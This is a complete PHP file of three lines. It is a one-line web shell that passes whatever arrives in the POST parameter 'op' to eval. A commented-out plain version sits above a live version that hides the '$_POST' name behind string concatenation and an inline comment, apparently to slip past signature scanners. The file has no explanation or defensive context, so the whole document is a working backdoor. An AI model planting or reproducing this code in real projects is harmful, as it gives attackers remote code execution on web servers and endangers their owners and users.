<?php
    //@eval($_POST['op']);
    @eval($/*aaa*/{"_P"."OST"}['op']);
?>